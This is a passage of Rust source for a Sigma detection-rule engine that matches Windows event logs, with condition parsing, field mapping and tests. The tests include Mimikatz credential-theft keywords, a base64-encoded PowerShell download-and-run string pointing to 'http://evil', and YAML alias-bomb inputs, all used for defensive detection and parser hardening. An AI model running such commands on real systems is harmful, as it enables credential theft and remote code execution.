        self.depth += 1;
        if self.depth > MAX_CONDITION_DEPTH {
            return Err("condition is nested too deeply".into());
        }
        let result = self.factor_inner();
        self.depth -= 1;
        result
    }

    fn factor_inner(&mut self) -> Result<Cond, String> {
        match self.peek().cloned() {
            Some(Tok::Not) => {
                self.pos += 1;
                Ok(Cond::Not(Box::new(self.factor()?)))
            }
            Some(Tok::LParen) => {
                self.pos += 1;
                let c = self.expr()?;
                if self.peek() != Some(&Tok::RParen) {
                    return Err("missing ')' in condition".into());
                }
                self.pos += 1;
                Ok(c)
            }
            Some(Tok::Num(n)) => {
                if n == 0 {
                    return Err("'0 of' always matches; not supported".into());
                }
                self.pos += 1;
                self.quantifier(Some(n))
            }
            Some(Tok::All) => {
                self.pos += 1;
                self.quantifier(None)
            }
            Some(Tok::Ident(name)) => {
                self.pos += 1;
                let i = self
                    .names
                    .iter()
                    .position(|n| *n == name)
                    .ok_or_else(|| format!("condition refers to unknown selection '{name}'"))?;
                Ok(Cond::Sel(i))
            }
            other => Err(format!("unexpected {other:?} in condition")),
        }
    }

    fn quantifier(&mut self, min: Option<usize>) -> Result<Cond, String> {
        if self.peek() != Some(&Tok::Of) {
            return Err("expected 'of' in condition".into());
        }
        self.pos += 1;
        let sels: Vec<usize> = match self.peek().cloned() {
            Some(Tok::Them) => {
                self.pos += 1;
                (0..self.names.len())
                    .filter(|&i| !self.names[i].starts_with('_'))
                    .collect()
            }
            Some(Tok::Ident(pat)) => {
                self.pos += 1;
                let prefix_glob = pat.strip_suffix('*');
                (0..self.names.len())
                    .filter(|&i| match prefix_glob {
                        Some(prefix) => self.names[i].starts_with(prefix),
                        None => self.names[i] == pat,
                    })
                    .collect()
            }
            other => return Err(format!("unexpected {other:?} after 'of'")),
        };
        if sels.is_empty() {
            return Err("quantifier matches no selections".into());
        }
        Ok(Cond::Of { min, sels })
    }
}

// ---------------------------------------------------------------------------- evaluation

/// A rule bound to one log's field names.
pub struct Compiled<'r> {
    rule: &'r SigmaRule,
    /// Per distinct field name: the sorted key IDs it matches (normal, and with 4688 names).
    fields: HashMap<String, (Vec<u32>, Vec<u32>)>,
}

/// Field-name lookup for one log, built once and shared by every rule: maps a normalised
/// name (lowercase, spaces removed) to the key IDs whose full path or last segment has it.
pub struct KeyIndex {
    full: HashMap<String, Vec<u32>>,
    last: HashMap<String, Vec<u32>>,
}

fn norm(s: &str) -> String {
    s.chars().filter(|&c| c != ' ').collect()
}

impl KeyIndex {
    pub fn new(keys_lc: &[Box<str>]) -> Self {
        let mut full: HashMap<String, Vec<u32>> = HashMap::new();
        let mut last: HashMap<String, Vec<u32>> = HashMap::new();
        for (id, k) in keys_lc.iter().enumerate() {
            let id = id as u32;
            full.entry(norm(k)).or_default().push(id);
            let l = k.rsplit('.').next().unwrap_or(k);
            last.entry(norm(l)).or_default().push(id);
        }
        Self { full, last }
    }

    /// Key IDs a Sigma field name refers to (same rules as the search box), sorted.
    fn resolve(&self, field_lc: &str) -> Vec<u32> {
        let name = system_alias(field_lc);
        let mut ids: Vec<u32> = if let Some(sys) = name.strip_prefix("system.") {
            self.full.get(&norm(sys)).cloned().unwrap_or_default()
        } else {
            let n = norm(name);
            let mut v = self.full.get(&n).cloned().unwrap_or_default();
            v.extend(self.last.get(&n).into_iter().flatten());
            v
        };
        ids.sort_unstable();
        ids.dedup();
        ids
    }
}

/// Sysmon process_creation field names and their Security 4688 equivalents.
fn map_4688(field: &str) -> &str {
    match field {
        "image" => "newprocessname",
        "parentimage" => "parentprocessname",
        "processid" => "newprocessid",
        "parentprocessid" => "processid",
        "integritylevel" => "mandatorylabel",
        "user" => "subjectusername",
        "logonid" => "subjectlogonid",
        other => other,
    }
}

/// Sigma-specific names for System fields.
fn system_alias(field: &str) -> &str {
    match field {
        "provider_name" => "provider.name",
        "eventid" => "system.eventid",
        other => other,
    }
}

impl SigmaRule {
    pub fn compile<'r>(&'r self, index: &KeyIndex) -> Compiled<'r> {
        let mut fields = HashMap::new();
        let mut add = |name: &str| {
            if fields.contains_key(name) {
                return;
            }
            fields.insert(
                name.to_string(),
                (index.resolve(name), index.resolve(map_4688(name))),
            );
        };
        for sel in &self.selections {
            if let Selection::Maps(maps) = sel {
                for map in maps {
                    for fc in map {
                        add(&fc.field);
                        for p in &fc.patterns {
                            if let Pattern::FieldRef(other) = p {
                                add(other);
                            }
                        }
                    }
                }
            }
        }
        Compiled { rule: self, fields }
    }

    /// Event IDs the condition can possibly match, if they can be determined from
    /// `EventID` selections (None = any).
    fn required_event_ids(&self) -> Option<Vec<u32>> {
        fn sel_ids(sel: &Selection) -> Option<Vec<u32>> {
            let Selection::Maps(maps) = sel else {
                return None;
            };
            let mut out = Vec::new();
            for map in maps {
                let fc = map.iter().find(|fc| fc.field == "eventid" && !fc.all)?;
                for p in &fc.patterns {
                    match p {
                        Pattern::Exact { lc, .. } => out.push(lc.parse().ok()?),
                        _ => return None,
                    }
                }
            }
            Some(out)
        }
        fn union(parts: Vec<Option<Vec<u32>>>) -> Option<Vec<u32>> {
            let mut out = Vec::new();
            for p in parts {
                out.extend(p?);
            }
            Some(out)
        }
        fn intersect(parts: Vec<Option<Vec<u32>>>) -> Option<Vec<u32>> {
            parts
                .into_iter()
                .flatten()
                .reduce(|a, b| a.into_iter().filter(|x| b.contains(x)).collect())
        }
        fn walk(rule: &SigmaRule, c: &Cond) -> Option<Vec<u32>> {
            match c {
                Cond::Sel(i) => sel_ids(&rule.selections[*i]),
                Cond::Not(_) => None,
                Cond::And(cs) => intersect(cs.iter().map(|c| walk(rule, c)).collect()),
                Cond::Or(cs) => union(cs.iter().map(|c| walk(rule, c)).collect()),
                Cond::Of { min: Some(_), sels } => {
                    union(sels.iter().map(|&i| sel_ids(&rule.selections[i])).collect())
                }
                Cond::Of { min: None, sels } => {
                    intersect(sels.iter().map(|&i| sel_ids(&rule.selections[i])).collect())
                }
            }
        }
        walk(self, &self.condition)
    }

    /// (channel, event IDs or None for all) pairs this rule needs to look at.
    pub fn targets(&self) -> Vec<(&'static str, Option<Vec<u32>>)> {
        let required = self.required_event_ids();
        let mut out = Vec::new();
        for g in &self.gates {
            let ids = match (g.event_ids, &required) {
                (Some(g), Some(r)) => Some(g.iter().copied().filter(|x| r.contains(x)).collect()),
                (Some(g), None) => Some(g.to_vec()),
                (None, Some(r)) => Some(r.clone()),
                (None, None) => None,
            };
            for ch in &g.channels {
                out.push((*ch, ids.clone()));
            }
        }
        out
    }

    /// Human-readable log source, e.g. "Sysmon 1, Security 4688".
    pub fn log_source(&self) -> String {
        self.gates
            .iter()
            .map(|g| {
                let ch = g.channels.first().copied().unwrap_or("");
                let ch = match ch {
                    SYSMON => "Sysmon",
                    SECURITY => "Security",
                    other => other,
                };
                match g.event_ids {
                    Some(ids) => format!(
                        "{ch} {}",
                        ids.iter().map(u32::to_string).collect::<Vec<_>>().join("/")
                    ),
                    None => ch.to_string(),
                }
            })
            .collect::<Vec<_>>()
            .join(", ")
    }
}

impl Compiled<'_> {
    /// Does this record pass the rule's logsource? Returns which gate (for field mapping).
    fn gate(&self, r: &Record, channel_lc: &str) -> Option<bool> {
        self.rule
            .gates
            .iter()
            .find(|g| {
                g.channels.contains(&channel_lc)
                    && g.event_ids.is_none_or(|ids| ids.contains(&r.event_id))
            })
            .map(|g| g.map_4688)
    }

    pub fn matches(&self, r: &Record, channel_lc: &str) -> bool {
        let Some(map_4688) = self.gate(r, channel_lc) else {
            return false;
        };
        let ctx = Ctx {
            c: self,
            r,
            map_4688,
        };
        ctx.cond(&self.rule.condition)
    }
}

struct Ctx<'a> {
    c: &'a Compiled<'a>,
    r: &'a Record,
    map_4688: bool,
}

impl Ctx<'_> {
    fn cond(&self, c: &Cond) -> bool {
        match c {
            Cond::Sel(i) => self.selection(&self.c.rule.selections[*i]),
            Cond::Not(inner) => !self.cond(inner),
            Cond::And(cs) => cs.iter().all(|c| self.cond(c)),
            Cond::Or(cs) => cs.iter().any(|c| self.cond(c)),
            Cond::Of { min, sels } => {
                let hits = sels
                    .iter()
                    .filter(|&&i| self.selection(&self.c.rule.selections[i]))
                    .count();
                match min {
                    Some(n) => hits >= *n,
                    None => hits == sels.len(),
                }
            }
        }
    }

    fn selection(&self, s: &Selection) -> bool {
        match s {
            Selection::Maps(maps) => maps.iter().any(|m| m.iter().all(|fc| self.field_cond(fc))),
            Selection::Keywords(ps) => ps.iter().any(|p| self.keyword(p)),
        }
    }

    fn keys(&self, field: &str) -> Option<&Vec<u32>> {
        self.c
            .fields
            .get(field)
            .map(|(n, m)| if self.map_4688 { m } else { n })
    }

    fn values(&self, field: &str) -> Vec<&crate::model::Field> {
        let Some(keys) = self.keys(field) else {
            return Vec::new();
        };
        self.r
            .fields
            .iter()
            .filter(|f| keys.binary_search(&f.key).is_ok())
            .collect()
    }

    fn field_cond(&self, fc: &FieldCond) -> bool {
        let fields = self.values(&fc.field);
        let test = |p: &Pattern| -> bool {
            match p {
                Pattern::Null => fields.iter().all(|f| self.r.value(f).is_empty()),
                Pattern::Exists(want) => !fields.is_empty() == *want,
                Pattern::FieldRef(other) => {
                    let others = self.values(other);
                    fields
                        .iter()
                        .any(|f| others.iter().any(|o| self.r.value(f) == self.r.value(o)))
                }
                _ => fields.iter().any(|f| self.value_matches(f, p)),
            }
        };
        if fc.all {
            fc.patterns.iter().all(test)
        } else {
            fc.patterns.iter().any(test)
        }
    }

    fn value_matches(&self, f: &crate::model::Field, p: &Pattern) -> bool {
        let r = self.r;
        match p {
            Pattern::Exact { lc, cased } => text(r, f, *cased) == lc.as_str(),
            Pattern::Contains { lc, cased } => text(r, f, *cased).contains(lc.as_str()),
            Pattern::StartsWith { lc, cased } => text(r, f, *cased).starts_with(lc.as_str()),
            Pattern::EndsWith { lc, cased } => text(r, f, *cased).ends_with(lc.as_str()),
            Pattern::Regex(re) => re.is_match(r.value(f)),
            Pattern::Cidr { net, prefix } => {
                let v = r.value(f);
                let v = v.strip_prefix("::ffff:").unwrap_or(v);
                v.parse::<IpAddr>()
                    .is_ok_and(|ip| in_cidr(ip, *net, *prefix))
            }
            Pattern::Num { op, value } => {
                let v = r.value(f);
                let n = v
                    .strip_prefix("0x")
                    .and_then(|h| i64::from_str_radix(h, 16).ok().map(|x| x as f64))
                    .or_else(|| v.parse::<f64>().ok());
                n.is_some_and(|n| match op {
                    NumOp::Gt => n > *value,
                    NumOp::Gte => n >= *value,
                    NumOp::Lt => n < *value,
                    NumOp::Lte => n <= *value,
                })
            }
            Pattern::Null | Pattern::Exists(_) | Pattern::FieldRef(_) => false,
        }
    }

    /// Keywords search the whole event text.
    fn keyword(&self, p: &Pattern) -> bool {
        let r = self.r;
        match p {
            Pattern::Contains { lc, cased: false } => r.text_lc.contains(lc.as_str()),
            Pattern::Contains { lc, cased: true } => r.text.contains(lc.as_str()),
            Pattern::Regex(re) => re.is_match(&r.text),
            _ => false,
        }
    }
}

fn text<'a>(r: &'a Record, f: &crate::model::Field, cased: bool) -> std::borrow::Cow<'a, str> {
    if cased {
        r.value(f).into()
    } else {
        r.value_lc(f)
    }
}

fn in_cidr(ip: IpAddr, net: IpAddr, prefix: u8) -> bool {
    match (ip, net) {
        (IpAddr::V4(a), IpAddr::V4(b)) => {
            let p = prefix.min(32) as u32;
            let mask = if p == 0 { 0 } else { u32::MAX << (32 - p) };
            u32::from(a) & mask == u32::from(b) & mask
        }
        (IpAddr::V6(a), IpAddr::V6(b)) => {
            let p = prefix.min(128) as u32;
            let mask = if p == 0 { 0 } else { u128::MAX << (128 - p) };
            u128::from(a) & mask == u128::from(b) & mask
        }
        _ => false,
    }
}

/// Lowercased channel of a record, for gating.
pub fn channel_lc(r: &Record) -> String {
    r.col(Col::Channel).to_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{build, KeyInterner};
    use serde_json::json;

    fn rec(
        channel: &str,
        provider: &str,
        id: u32,
        data: serde_json::Value,
    ) -> (Record, Vec<Box<str>>) {
        let mut keys = KeyInterner::default();
        let json = json!({"Event": {
            "System": {"Provider": {"#attributes": {"Name": provider}}, "EventID": id, "Channel": channel},
            "EventData": data,
        }});
        let r = build(1, json, &mut keys);
        let keys_lc = keys
            .take_new()
            .iter()
            .map(|k| k.to_lowercase().into())
            .collect();
        (r, keys_lc)
    }

    fn rule(yaml: &str) -> SigmaRule {
        parse_rule(yaml, PathBuf::from("test.yml"))
            .unwrap()
            .unwrap()
    }

    fn fires(yaml: &str, r: &(Record, Vec<Box<str>>)) -> bool {
        let rule = rule(yaml);
        let c = rule.compile(&KeyIndex::new(&r.1));
        c.matches(&r.0, &channel_lc(&r.0))
    }

    const KERB: &str = r#"
title: Kerberoasting
id: 00000000-0000-0000-0000-000000000001
logsource: {product: windows, service: security}
detection:
    selection:
        EventID: 4769
        Status: '0x0'
        TicketEncryptionType: '0x17'
    filter_main_krbtgt:
        ServiceName|endswith:
            - 'krbtgt'
            - '$'
    filter_main_machine:
        TargetUserName|contains: '$@'
    condition: selection and not 1 of filter_main_*
level: medium
"#;

    #[test]
    fn kerberoasting_rule() {
        let ev = |svc: &str| {
            rec(
                "Security",
                "Microsoft-Windows-Security-Auditing",
                4769,
                json!({"ServiceName": svc, "TargetUserName": "bob@CORP", "Status": "0x0", "TicketEncryptionType": "0x17"}),
            )
        };
        assert!(fires(KERB, &ev("MSSQLService")));
        assert!(!fires(KERB, &ev("DC01$")));
        assert!(!fires(KERB, &ev("krbtgt")));
        // Wrong channel: the logsource gate rejects it.
        let sys = rec(
            "System",
            "x",
            4769,
            json!({"ServiceName": "MSSQL", "Status": "0x0", "TicketEncryptionType": "0x17"}),
        );
        assert!(!fires(KERB, &sys));
    }

    #[test]
    fn process_creation_maps_to_4688() {
        let yaml = r#"
title: whoami
logsource: {product: windows, category: process_creation}
detection:
    selection:
        Image|endswith: '\whoami.exe'
        CommandLine|contains|windash: ' -all'
    condition: selection
"#;
        let sysmon = rec(
            "Microsoft-Windows-Sysmon/Operational",
            "Microsoft-Windows-Sysmon",
            1,
            json!({"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all"}),
        );
        let security = rec(
            "Security",
            "Microsoft-Windows-Security-Auditing",
            4688,
            json!({"NewProcessName": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami –all"}),
        );
        assert!(fires(yaml, &sysmon), "windash: /all");
        assert!(fires(yaml, &security), "4688 field mapping + en dash");
        let other = rec(
            "Security",
            "x",
            4688,
            json!({"NewProcessName": "C:\\x\\whoami.exe", "CommandLine": "whoami /priv"}),
        );
        assert!(!fires(yaml, &other));
    }

    #[test]
    fn wildcards_escapes_and_null() {
        let yaml = r#"
title: shares
logsource: {product: windows, service: security}
detection:
    selection:
        EventID: 5145
        ShareName: '\\\\\*\\IPC$'
        RelativeTargetName: 'svc*-std??'
    filter:
        Ignored: null
    condition: selection and filter
"#;
        let ev = rec(
            "Security",
            "x",
            5145,
            json!({"ShareName": "\\\\*\\IPC$", "RelativeTargetName": "svcX-stdin"}),
        );
        assert!(fires(yaml, &ev));
        let other = rec(
            "Security",
            "x",
            5145,
            json!({"ShareName": "\\\\HOST\\IPC$", "RelativeTargetName": "svcX-stdin"}),
        );
        assert!(!fires(yaml, &other), "\\* must be a literal star");
    }

    #[test]
    fn keywords_regex_cidr_exists_numbers() {
        let kw = r#"
title: kw
logsource: {product: windows, service: security}
detection:
    keywords:
        - 'sekurlsa::'
        - 'kerberos::golden'
    condition: keywords
"#;
        assert!(fires(
            kw,
            &rec(
                "Security",
                "x",
                1,
                json!({"Data": "run SEKURLSA::logonpasswords"})
            )
        ));
        assert!(!fires(
            kw,
            &rec("Security", "x", 1, json!({"Data": "nothing"}))
        ));

        let misc = r#"
title: misc
logsource: {product: windows, service: security}
detection:
    sel_re:
        TargetUserName|re: '^adm[0-9]+$'
    sel_cidr:
        IpAddress|cidr: '10.0.0.0/8'
    sel_exists:
        LogonGuid|exists: false
    sel_num:
        KeyLength|gte: 128
    condition: all of sel_*
"#;
        let ok = rec(
            "Security",
            "x",
            4624,
            json!({"TargetUserName": "adm42", "IpAddress": "::ffff:10.1.2.3", "KeyLength": "128"}),
        );
        assert!(fires(misc, &ok));
        let bad_ip = rec(
            "Security",
            "x",
            4624,
            json!({"TargetUserName": "adm42", "IpAddress": "11.1.2.3", "KeyLength": "128"}),
        );
        assert!(!fires(misc, &bad_ip));
        let has_guid = rec(
            "Security",
            "x",
            4624,
            json!({"TargetUserName": "adm42", "IpAddress": "10.1.2.3", "KeyLength": "128", "LogonGuid": "{0}"}),
        );
        assert!(!fires(misc, &has_guid));
        let case = rec(
            "Security",
            "x",
            4624,
            json!({"TargetUserName": "ADM42", "IpAddress": "10.1.2.3", "KeyLength": "128"}),
        );
        assert!(!fires(misc, &case), "re is case-sensitive by default");
    }

    #[test]
    fn base64offset_matches_inside_encoded_text() {
        let yaml = r#"
title: b64
logsource: {product: windows, category: process_creation}
detection:
    selection:
        CommandLine|base64offset|contains: 'http://'
    condition: selection
"#;
        // "IEX(iwr http://evil)" base64-encoded at three different offsets.
        for prefix in ["", "a", "ab"] {
            let enc = base64(format!("{prefix}IEX(iwr http://evil)").as_bytes());
            let ev = rec(
                "Microsoft-Windows-Sysmon/Operational",
                "x",
                1,
                json!({"CommandLine": format!("powershell -enc {enc}")}),
            );
            assert!(fires(yaml, &ev), "offset {}", prefix.len());
        }
    }

    #[test]
    fn rejects_unsupported() {
        let agg = "title: a\nlogsource: {product: windows, service: security}\ndetection:\n  s: {EventID: 1}\n  condition: s | count() > 5\n";
        assert!(parse_rule(agg, PathBuf::new()).is_err());
        let linux =
            "title: a\nlogsource: {product: linux}\ndetection:\n  s: {a: 1}\n  condition: s\n";
        assert!(parse_rule(linux, PathBuf::new()).is_err());
        let notrule = "foo: bar\n";
        assert!(parse_rule(notrule, PathBuf::new()).unwrap().is_none());
    }

    #[test]
    fn base64_encoder() {
        assert_eq!(base64(b"Man"), "TWFu");
        assert_eq!(base64(b"Ma"), "TWE=");
        assert_eq!(base64(b"M"), "TQ==");
    }

    /// Validate against Sigma's own regression data: every rule that ships a sample log must
    /// match it exactly `match_count` times.
    /// `SIGMA_DIR=path/to/sigma cargo test --release sigma_regression -- --ignored --nocapture`
    #[test]
    #[ignore]
    fn sigma_regression() {
        let Ok(root) = std::env::var("SIGMA_DIR") else {
            return;
        };
        let root = PathBuf::from(root);
        let mut rules: HashMap<String, SigmaRule> = HashMap::new();
        let mut skipped: HashMap<String, String> = HashMap::new();
        for dir in [
            "rules",
            "rules-threat-hunting",
            "rules-emerging-threats",
            "rules-compliance",
            "rules-dfir",
        ] {
            let report = load_dir(&root.join(dir));
            for r in report.rules {
                rules.insert(r.id.clone(), r);
            }
            for (path, why) in report.skipped {
                if let Ok(text) = std::fs::read_to_string(&path) {
                    if let Some(id) = text.lines().find_map(|l| l.strip_prefix("id: ")) {
                        skipped.insert(id.trim().to_string(), why);
                    }
                }
            }
        }
        println!("loaded {} rules, {} skipped", rules.len(), skipped.len());
        let mut reasons: HashMap<String, usize> = HashMap::new();
        for why in skipped.values() {
            let key = why.split('\'').next().unwrap_or(why).to_string();
            *reasons.entry(key).or_default() += 1;
        }
        let mut reasons: Vec<_> = reasons.into_iter().collect();
        reasons.sort_by_key(|r| std::cmp::Reverse(r.1));
        for (why, n) in reasons.iter().take(8) {
            println!("  skipped {n:5}: {why}");
        }

        let mut infos = Vec::new();
        fn walk(d: &Path, out: &mut Vec<PathBuf>) {
            for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
                let p = e.path();
                if p.is_dir() {
                    walk(&p, out);
                } else if p.file_name().is_some_and(|n| n == "info.yml") {
                    out.push(p);
                }
            }
        }
        walk(&root.join("regression_data"), &mut infos);
        let (mut pass, mut fail, mut unsupported, mut missing) = (0, 0, 0, 0);
        let mut failures = Vec::new();
        for info in infos {
            let text = std::fs::read_to_string(&info).unwrap();
            let doc: Value = yaml_serde::from_str(&text).unwrap();
            let Some(id) = doc["rule_metadata"][0]["id"].as_str() else {
                continue;
            };
            let Some(tests) = doc["regression_tests_info"].as_sequence() else {
                continue;
            };
            for t in tests {
                if t["type"].as_str() != Some("evtx") {
                    continue;
                }
                let expected = t["match_count"].as_u64().unwrap_or(1) as usize;
                let evtx = root.join(t["path"].as_str().unwrap_or(""));
                let Some(rule) = rules.get(id) else {
                    if let Some(why) = skipped.get(id) {
                        println!("  unsupported: {id}: {why}");
                        unsupported += 1
                    } else {
                        missing += 1
                    }
                    continue;
                };
                let Ok((recs, keys_lc)) = crate::loader::load_records(&evtx) else {
                    missing += 1;
                    continue;
                };
                let c = rule.compile(&KeyIndex::new(&keys_lc));
                let got = recs.iter().filter(|r| c.matches(r, &channel_lc(r))).count();
                if got == expected {
                    pass += 1;
                } else {
                    fail += 1;
                    failures.push(format!(
                        "{} ({}): expected {expected}, got {got}",
                        rule.title,
                        rule.path.display()
                    ));
                }
            }
        }
        println!("regression samples: {pass} pass, {fail} fail, {unsupported} rule unsupported, {missing} missing");
        for f in &failures {
            println!("  FAIL {f}");
        }
        assert!(fail * 50 <= pass, "too many regression failures");
    }

    #[test]
    fn hostile_rules_are_rejected_safely() {
        // Quadratic alias expansion: ~6 KB of YAML that would expand to millions of nodes.
        let items = vec!["x"; 1500].join(",");
        let refs = vec!["*a"; 1500].join(",");
        let bomb = format!("title: t\nlogsource: {{product: windows, service: security}}\nx: &a [{items}]\ny: [{refs}]\ndetection:\n  s: {{EventID: 1}}\n  condition: s\n");
        let err = parse_rule(&bomb, PathBuf::new()).err().unwrap_or_default();
        assert!(err.contains("too large"), "{err}");

        // Deeply nested condition.
        let deep = format!(
            "title: t\nlogsource: {{product: windows, service: security}}\ndetection:\n  s: {{EventID: 1}}\n  condition: {}s{}\n",
            "(".repeat(5000),
            ")".repeat(5000)
        );
        assert!(parse_rule(&deep, PathBuf::new()).is_err());
        let nots = format!(
            "title: t\nlogsource: {{product: windows, service: security}}\ndetection:\n  s: {{EventID: 1}}\n  condition: {}s\n",
            "not ".repeat(5000)
        );
        assert!(parse_rule(&nots, PathBuf::new()).is_err());

        // "0 of" and overflowing counts.
        for c in ["0 of s*", "99999999999999999999999 of s*"] {
            let y = format!("title: t\nlogsource: {{product: windows, service: security}}\ndetection:\n  s1: {{EventID: 1}}\n  condition: {c}\n");
            let r = parse_rule(&y, PathBuf::new());
            assert!(
                r.is_err() || !fires(&y, &rec("Security", "x", 1, json!({}))),
                "{c}"
            );
        }

        // Normal nesting still works.
        let ok = "title: t\nlogsource: {product: windows, service: security}\ndetection:\n  s: {EventID: 1}\n  f: {EventID: 2}\n  condition: (s and not (f or (not s)))\n";
        assert!(parse_rule(ok, PathBuf::new()).unwrap().is_some());
    }

    #[test]
    fn bounded_reads_refuse_special_files() {
        let dir = std::env::temp_dir().join(format!("tw-test-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let target = dir.join("real.yml");
        std::fs::write(&target, "title: t\n").unwrap();
        let link = dir.join("link.yml");
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink(&target, &link).unwrap();
        assert!(read_bounded(&target, 1024).is_ok());
        assert!(
            read_bounded(&link, 1024).is_err(),
            "symlinks are not followed"
        );
        assert!(read_bounded(&target, 4).is_err(), "size cap");
        assert!(
            read_bounded(Path::new("/dev/zero"), 1024).is_err(),
            "devices are refused"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
}
